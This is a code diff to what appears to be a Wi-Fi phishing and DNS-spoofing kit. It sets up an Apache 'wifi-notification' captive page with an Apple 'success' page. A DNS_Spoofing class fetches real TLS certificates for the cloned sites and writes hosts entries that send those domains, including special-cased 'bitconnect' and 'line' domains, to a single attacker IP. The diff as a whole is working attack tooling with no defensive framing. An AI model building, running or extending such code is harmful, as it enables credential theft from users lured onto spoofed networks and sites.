@@ -52,7 +52,7 @@ def Set_Log():
         group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir2+"WEB_AUTH_db.txt" 
         os.system(group1)   
           
-    os.system('sudo mkdir /var/www/html/wifi-notification')
+    os.makedirs('/var/www/html/wifi-notification',exist_ok=True)
     shutil.copy(LOG_PATH+'/resources/index.html', '/var/www/html/wifi-notification/')
     shutil.copy(LOG_PATH+'/resources/apple-success.html', '/var/www/html/wifi-notification/')
     shutil.copy(LOG_PATH+'/resources/wifi-notification.conf', '/etc/apache2/sites-available/')
@@ -124,26 +124,23 @@ class DNS_Spoofing:
                 print("[+] SSL Certificateificate File Directory Created")
                 for domain in os.listdir(Path(LOG_PATH) / "sites"):
                     try:
-                        host = f"www.{domain}.com"
+                        if "bitconnect" in domain:
+                            host =  f"www.{domain}.hosting"
+                        elif "line" in domain:
+                            host = f"www.{domain}.me" 
+                        else:       
+                            host = f"www.{domain}.com"
                         context = ssl.create_default_context()
                         print(f"{Y}[-] Fetch Certificate for {host}{W}")
                         sys.stdout.write('\x1b[1A')
                         sys.stdout.write('\x1b[2K')   
-                        with socket.create_connection((host, port), timeout=15) as sock:
+                        with socket.create_connection((host, port), timeout=5) as sock:
                             with context.wrap_socket(sock, server_hostname=host) as ssock:
                                 cert_pem = ssl.DER_cert_to_PEM_cert(ssock.getpeercert(True))
                                 Cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_pem)
                     except Exception:
-                        try:
-                            host = f"www.{domain}.org"
-                            context = ssl.create_default_context()
-                            with socket.create_connection((host, port), timeout=5) as sock:
-                                with context.wrap_socket(sock, server_hostname=host) as ssock:
-                                    cert_pem = ssl.DER_cert_to_PEM_cert(ssock.getpeercert(True))
-                                    Cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_pem)
-                        except Exception:
-                            print(f"{R}[-] Failed to fetch certificate for {host}{W}")
-                            continue
+                        print(f"{R}[-] Failed to fetch certificate for {domain}{W}")
+                        continue
 
                     OUTPUT = ssl_dir / f"{domain}.pem"
                     public_key = Cert.get_pubkey()
@@ -287,17 +284,40 @@ class DNS_Spoofing:
             else:
                 with open(LOG_PATH+'/resources/hosts.txt','w') as hosts:
                     for host in os.listdir(LOG_PATH+"/sites"):  
-                        with open(LOG_PATH+'/resources/hosts.txt','a') as hosts:                         
-                          hosts.write(
+                        with open(LOG_PATH+'/resources/hosts.txt','a') as hosts:  
+                            if "bitconnect" in host:
+                                hosts.write(
                                     '172.160.255.49'.ljust(20) +  # Right-align IP
                                     ('www.' + host + '.local').ljust(25) +
                                     (host + '.local').ljust(22) +
                                     ('www.' + host + '.wifi').ljust(25) +
                                     (host + '.wifi').ljust(25) +
-                                    (host + '.com').ljust(25) +
-                                    ('www.' + host + '.com').ljust(25) +
+                                    (host + '.hosting').ljust(25) +
+                                    ('www.' + host + '.hosting').ljust(25) +
+                                    '\n'
+                               )
+                            elif "line" in host:
+                                hosts.write(
+                                    '172.160.255.49'.ljust(20) +  # Right-align IP
+                                    ('www.' + host + '.local').ljust(25) +
+                                    (host + '.local').ljust(22) +
+                                    ('www.' + host + '.wifi').ljust(25) +
+                                    (host + '.wifi').ljust(25) +
+                                    (host + '.me').ljust(25) +
+                                    ('www.' + host + '.me').ljust(25) +
                                     '\n'
                                 )
+                            else:
+                                hosts.write(
+                                        '172.160.255.49'.ljust(20) +  # Right-align IP
+                                        ('www.' + host + '.local').ljust(25) +
+                                        (host + '.local').ljust(22) +
+                                        ('www.' + host + '.wifi').ljust(25) +
+                                        (host + '.wifi').ljust(25) +
+                                        (host + '.com').ljust(25) +
+                                        ('www.' + host + '.com').ljust(25) +
+                                        '\n'
+                                    )
 
                     print("[+] Hosts dns resolve Name has be Created")
                  
